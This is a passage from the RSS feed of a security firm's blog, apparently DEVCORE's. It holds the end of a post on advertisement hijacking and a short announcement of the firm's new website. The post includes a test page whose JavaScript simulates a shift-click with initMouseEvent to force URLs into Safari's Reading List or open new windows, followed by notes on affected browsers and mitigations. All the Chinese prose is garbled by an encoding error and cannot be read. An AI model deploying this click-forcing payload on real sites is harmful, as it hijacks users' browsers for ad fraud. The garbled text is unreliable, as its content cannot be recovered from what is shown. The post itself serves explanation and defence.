        &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initMouseEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatchEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// nothing.&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://google.com/?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Test: FORCE_ADD_URL_TO_READINGLIST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Âà©Áî®„Äå&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&quot;&gt;initMouseEvent&lt;/a&gt;„ÄçÊ®°Êì¨ÊªëÈº†ÁöÑÈªûÊìäÔºåÂú® URL ‰∏äÊåâ‰∏ã Shift ÈçµÈªûÊìä„ÄÇÂú®‰∏ÄËà¨ÁÄèË¶ΩÂô®‰∏≠ÊòØ„ÄåÈñãÂïüÊñ∞Ë¶ñÁ™ó„ÄçÔºåÂú® Safari ‰∏≠ÂâáÊòØ„ÄåÂä†ÂÖ•Èñ±ËÆÄÊ∏ÖÂñÆ„Äç‰∫ÜÔºåÂõ†Ê≠§ÂΩ¢ÊàêÂª£ÂëäË¶ñÁ™ó‰∏çÊñ∑Âä†ÂÖ•Èñ±ËÆÄÊ∏ÖÂñÆÁöÑÁèæË±°„ÄÇÂª£ÂëäÂïÜÂà©Áî®ÈÄôÁ®ÆÊâãÊ≥ïÂ¢ûÂä†Âª£ÂëäÁöÑÈªûÊìäÁéáÔºåÂè™Ë¶ÅÁÄèË¶ΩÂô®Ê≤íÊúâÂÆâË£ùÈòªÊìãÂª£ÂëäÁöÑÂ•ó‰ª∂ÊàñËÄÖÊòØÈòªÊìã„ÄåÂΩàÂá∫ÂºèË¶ñÁ™ó„ÄçÔºå‰Ω†Â∞±ÊúÉÊàêÁÇ∫ÊµÅÈáèÁöÑË≤¢ÁçªËÄÖ„ÄÇ&lt;/p&gt;

&lt;p&gt;Á∂ìÈÅéÊàëÂÄëÁöÑÊ∏¨Ë©¶ÔºåInternet Explorer„ÄÅMozilla Firefox ‰∏çÊúÉÂèóÈÄôÈ°ûÊîªÊìäÂΩ±ÈüøÔºåGoogle Chrome„ÄÅOpera ÂâáÊúÉË¢´ÂÖßÂª∫ÁöÑ Pop-up Ë¶ñÁ™óÈòªÊìãÂäüËÉΩÊìã‰∏ã„ÄÇ‰ΩÜËã•ÊòØÁõ¥Êé•Ê®°Êì¨ÈªûÊìäÔºåÂâáÂÖ®Êï∏ÁÄèË¶ΩÂô®ÈÉΩÊúÉÂèóÂΩ±ÈüøÂ∞éÂêëËá≥ URL„ÄÇÈõñÁÑ∂ÈÄôÁ®ÆÈ°ûÂûãÁöÑÊîªÊìä‰∏çÊúÉÈÄ†ÊàêÂØ¶Ë≥™‰∏äÁöÑÊêçÂ§±Ë∑üÂç±ÂÆ≥Ôºå‰ΩÜËã•ÊòØÁµêÂêàÂÖ∂‰ªñÊÉ°ÊÑèÊâãÊ≥ïÂ∞áÂèØ‰ª•ÈÄ†ÊàêÊîªÊìä„ÄÇ‰æãÂ¶ÇÈÄèÈÅéÁ∂≤Á´ôÊéõÁ¢ºÂ∞á‰ΩøÁî®ËÄÖÂ∞éÂêëËá≥ÊÉ°ÊÑèÁ∂≤Á´ôÁ≠âÁ≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëã•Ë¶ÅÈÅøÂÖçÊ≠§È°ûÂûãÊîªÊìäÔºåÊúâ‰ª•‰∏ãÂπæÂÄãÂª∫Ë≠∞ÊñπÊ°àÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÂÆâË£ù NoScript È°ûÂûãÂ•ó‰ª∂ÔºåÂÉÖÂÖÅË®±ÂèØ‰ø°Ë≥¥ÁöÑÁ∂≤Á´ôÂü∑Ë°å JavaScript&lt;/li&gt;
  &lt;li&gt;ÈñãÂïü„ÄåÂΩàÂá∫ÂºèË¶ñÁ™ó„ÄçÈòªÊìãÂäüËÉΩÔºå‰∏¶Â∞áÁ∂≤Á´ôÂÆâÂÖ®ÊÄßÁ≠âÁ¥öÊèêÈ´ò„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÆâË£ù AdBlock Á≠âÂª£ÂëäÈòªÊìãÂ•ó‰ª∂Ôºà‰ΩÜÊúÉÂΩ±ÈüøÁ∂≤Á´ôÁáüÊî∂Ôºâ&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî®ÊúÄÊñ∞ÁâàÊú¨ÁÄèË¶ΩÂô®‰ª•Á≠ñÂÆâÂÖ®&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Á∂≤È†ÅÂûãÁöÑÊîªÊìäË∂ä‰æÜË∂äÂ§öÊ®£ÂåñÔºåÈô§‰∫Ü‰æùË≥¥ÁÄèË¶ΩÂô®Êú¨Ë∫´ÁöÑ‰øùË≠∑‰∏¶Ëºî‰ª•Á¨¨‰∏âÊñπÂÆâÂÖ®Â•ó‰ª∂‰πãÂ§ñÔºåÊõ¥ÈúÄË¶Å‰ΩøÁî®ËÄÖÊú¨Ë∫´ÁöÑÂÆâÂÖ®ÊÑèË≠òÔºåÊâçËÉΩÂÆâÂøÉÊö¢Âø´ÁöÑÁÄèË¶ΩÁ∂≤Ë∑ØÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking/</link>
                <guid>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking</guid>
                <pubDate>Thu, 06 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE Êñ∞Á∂≤Á´ô‰∏äÁ∑öÔºÅ</title>
                <description>&lt;p&gt;DEVCORE ÁöÑÊñ∞Á∂≤Á´ô‰∏äÁ∑ö‰∫ÜÔºÅ&lt;br /&gt;
ÈùûÂ∏∏ÊÑüË¨ùÂ∞àÊ•≠ÁöÑ &lt;a href=&quot;http://evendesign.tw/&quot;&gt;EVENDESIGN&lt;/a&gt; Âπ´ÊàëÂÄëË®≠Ë®àÁ≤æÁæéÁöÑÁ∂≤Á´ôÔºÅ&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÁõÆÂâç‰∏ªË¶ÅÊúçÂãôÈ†ÖÁõÆÁÇ∫Êª≤ÈÄèÊ∏¨Ë©¶„ÄÅË≥áÂÆâÊïôËÇ≤Ë®ìÁ∑¥„ÄÅË≥áÂÆâ‰∫ã‰ª∂ËôïÁêÜ„ÄÅË≥áÂÆâÈ°ßÂïèÊúçÂãôÔºå&lt;br /&gt;
ÂêÑÈ†ÖÊúçÂãôÁöÑË©≥Á¥∞ÂÖßÂÆπÂèØÂèÉËÄÉ &lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Services&lt;/a&gt; È†ÅÈù¢„ÄÇ&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂêåÊôÇÔºåÂú®ÂÆòÁ∂≤‰∏≠ÊàëÂÄëÂ∞áÊúÉ‰∏çÂÆöÊúüÊèê‰æõÊúÄÊñ∞ÁöÑË≥áÂÆâÊñ∞Áü•ÂèäÊäÄË°ìÊñáÁ´†Ôºå&lt;br /&gt;
Â∏åÊúõËóâÁî±ÊàëÂÄëÁöÑÂäõÈáèËÆìÂ§ßÁúæÊõ¥Ê∏ÖÊ•öË≥áË®äÂÆâÂÖ®ÁöÑÈáçË¶Å„ÄÇ&lt;br /&gt;
‰∏¶‰∏îÈÄèÈÅéÁ´ôÂÖßÁöÑÊïôÂ≠∏ÊñáÁçªÔºåËÆìÈñãÁôºËÄÖ„ÄÅÁÆ°ÁêÜËÄÖÈÄ≤‰∏ÄÊ≠•‰∫ÜËß£Èß≠ÂÆ¢ÁöÑÊÄùÁ∂≠„ÄÅÊîªÈò≤ÁöÑÊâãÊ≥ïÔºå&lt;br /&gt;
Áü•Â∑±Áü•ÂΩºÔºåÊâçËÉΩÁôæÊà∞‰∏çÊÄ†„ÄÇÁû≠Ëß£Â¶Ç‰ΩïÊîªÊìäÔºåÊõ¥ËÉΩÁü•ÈÅìÂ¶Ç‰ΩïÈò≤Á¶¶„ÄÇ&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ëã•Â∞çÊàëÂÄëÁöÑÁ∂≤Á´ôÂÖßÂÆπÊàñÊúçÂãôÊúâ‰ªª‰ΩïÂª∫Ë≠∞ÔºåÊ≠°ËøéÊÇ®Èö®ÊôÇËàáÊàëÂÄëËÅØÁπ´„ÄÇ&lt;br /&gt;
Â∏åÊúõÊàëÂÄëËÉΩÁÇ∫ÊÇ®ÁöÑ‰ºÅÊ•≠Ë≥áË®äÂÆâÂÖ®ÊúÄ‰Ω≥ÊääÈóúËÄÖÔºÅ&lt;br /&gt;
Ê≠°ËøéÈö®ÊôÇËÅØÁµ°ÊàëÂÄëÔºÅ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact [at] devco.re&lt;/code&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/02/27/devcore-new-website/</link>
                <guid>https://devco.re/blog/2014/02/27/devcore-new-website</guid>
                <pubDate>Thu, 27 Feb 2014 00:00:00 +0800</pubDate>
        </item>


</channel>
</rss>
